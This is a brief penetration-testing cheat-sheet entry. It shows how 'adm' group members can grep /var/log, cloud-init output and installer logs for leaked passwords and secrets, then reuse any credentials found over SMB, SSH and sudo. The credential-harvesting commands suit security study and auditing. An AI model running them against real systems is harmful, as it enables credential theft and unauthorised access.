# ADM Group Log Credential Leak

Members of the `adm` group can read all log files under `/var/log/` including application logs that capture provisioning commands. Credentials passed as command-line arguments or written during setup often end up here.

```bash
id   # confirm adm membership

# grep all readable log files for common credential patterns
grep -r -i 'password\|passwd\|secret\|key=' /var/log/ 2>/dev/null
grep -r -i 'useradd\|chpasswd\|-p ' /var/log/ 2>/dev/null

# cloud-init and provisioning tools are common sources
grep -i 'pass' /var/log/cloud-init-output.log 2>/dev/null
grep -i 'pass' /var/log/installer/syslog 2>/dev/null
```

Once a credential is found, test it against local users and re-use across SMB/SSH/sudo.
